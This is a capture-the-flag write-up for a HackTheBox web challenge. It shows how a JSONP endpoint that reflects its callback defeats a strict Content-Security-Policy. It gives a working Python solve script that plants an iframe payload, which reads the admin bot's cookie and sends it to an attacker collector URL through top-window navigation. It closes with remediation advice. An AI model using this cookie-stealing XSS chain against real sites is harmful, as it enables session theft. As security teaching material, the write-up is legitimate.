---
layout: post
title: "Alien Complaint Form"
date: 2028-03-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, csp-bypass, jsonp, stored-xss, fastify]
description: "A strict Content-Security-Policy locks down a complaint form — but the app ships its own JSONP endpoint, a same-origin script source that reflects arbitrary JavaScript. Chain a stored iframe injection through it to run code in the bot's session and steal the flag cookie."
---

## Overview

Alien Complaint Form is a Medium web challenge. A Fastify app takes "complaints," and a headless admin bot — carrying the flag in a cookie — periodically visits an internal `/list` page that renders them. The site proudly deploys a Content-Security-Policy. The catch, spelled out by the brief ("the Human resistance left a backdoor"), is that the app also exposes a JSONP endpoint, and JSONP and CSP `'self'` [don't always get along](https://cwe.mitre.org/data/definitions/79.html).

## The pieces

**The secret.** `bot.js` sets a `flag` cookie with no `httpOnly` flag, then visits `http://127.0.0.1:1337/list`. Any JavaScript running in that origin can read `document.cookie`.

**The CSP.** Both pages carry:

```
default-src 'self'; object-src 'none'; base-uri 'none'; style-src 'self' ...; font-src 'self' ...
```

So scripts, `fetch`, and images are all restricted to same-origin, and inline scripts/handlers are blocked. But there's no `navigate-to` directive — top-level **navigation** to any origin is still allowed.

**The stored sink.** `list.js` renders each complaint with `tbody.innerHTML += \`...${complaint.complaint}...\``, unsanitized. That's stored HTML injection — but a `<script>` inserted via `innerHTML` doesn't execute, and inline handlers are CSP-blocked. An `<iframe>`, however, *does* load.

**The backdoor.** `/api/jsonp?callback=X` returns `X(<feedback JSON>)` with `Content-Type: application/javascript` and no validation of `X`. That's a same-origin script whose body you control — a clean `script-src 'self'` bypass. And `list.js` bootstraps it from the URL: `script.src = '/api/jsonp?callback=' + new URLSearchParams(location.search).get('callback')`.

## The chain

Put them together. Submit a complaint containing an iframe that reloads `/list` with a chosen callback:

```
<iframe src="/list?callback=EVIL"></iframe>
```

When the bot renders `/list`, the iframe loads `/list?callback=EVIL`; inside it, `list.js` script-loads `/api/jsonp?callback=EVIL`; the response `EVIL(json)` executes `EVIL` **same-origin**. `EVIL` reads the flag cookie and exfiltrates it by navigating the top window to an attacker collector.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, urllib.parse, urllib.request
target, wh = sys.argv[1], sys.argv[2]          # host:port , collector-id

# template literal (no '+'), top-level navigation, // comments out the JSONP wrapper's (json)
evil = "top.location=`https://<collector>/%s/?c=${document.cookie}`//" % wh
cb = urllib.parse.quote(evil, safe='')
complaint = f'<iframe src="/list?callback={cb}"></iframe>'

body = urllib.parse.urlencode({"complaint": complaint}).encode()
req = urllib.request.Request(f"http://{target}/api/submit", data=body,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
print(urllib.request.urlopen(req, timeout=15).read().decode())
# read the flag cookie from your collector: ?c=flag=HTB{...}
```

The collector receives the navigation with the cookie:

```
HTB{...}
```

## The two gotchas

- **Use `top.location`, not the iframe's own `document.location`.** A sub-frame navigation races the bot's `browser.close()` after `networkidle2`; navigating the main frame is awaited, so the exfil request actually goes out.
- **No `+` in the payload.** Fastify's (and Express's) query parser decodes `+` as a space, which would turn `'url'+document.cookie` into `'url' document.cookie` and break the script. A template literal (``\`...${document.cookie}\```) sidesteps it entirely.

## Why it worked

CSP `'self'` is only as strong as the same-origin resources it trusts, and a JSONP endpoint that reflects its callback is an attacker-controlled same-origin script by definition. Blocking `fetch` and images didn't matter because navigation was left open. The stored-XSS sink couldn't run a script directly, but it could load an iframe that bootstrapped the whole chain.

## Fix / defense

Retire JSONP in favor of CORS-guarded JSON, or strictly allow-list the callback name (`/^[A-Za-z0-9_]{1,32}$/`) so it can never be code — and never serve reflected input as `application/javascript`. Set `httpOnly` and `SameSite` on secret cookies, and tighten the CSP with a script nonce plus `navigate-to`/`form-action` so a same-origin script can't exfiltrate by redirect.
